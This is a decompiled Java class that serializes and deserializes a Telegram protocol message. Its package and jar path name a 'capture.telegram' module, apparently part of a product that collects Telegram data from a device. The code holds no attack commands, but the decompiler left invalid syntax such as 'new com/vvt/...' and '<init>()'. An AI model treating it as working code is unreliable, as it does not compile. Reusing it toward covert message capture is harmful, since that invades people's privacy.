package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_messages_receivedMessages
  extends TLObject
{
  public static int constructor = 94983360;
  public int max_id;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    TLRPC.Vector localVector = new com/vvt/capture/telegram/internal/TLRPC$Vector;
    localVector.<init>();
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    int j = 0;
    for (;;)
    {
      TLRPC.TL_receivedNotifyMessage localTL_receivedNotifyMessage;
      if (j < i)
      {
        int k = paramAbstractSerializedData.readInt32(paramBoolean);
        localTL_receivedNotifyMessage = TLRPC.TL_receivedNotifyMessage.TLdeserialize(paramAbstractSerializedData, k, paramBoolean);
        if (localTL_receivedNotifyMessage != null) {}
      }
      else
      {
        return localVector;
      }
      ArrayList localArrayList = localVector.objects;
      localArrayList.add(localTL_receivedNotifyMessage);
      j += 1;
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.max_id;
    paramAbstractSerializedData.writeInt32(i);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_receivedMessages.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */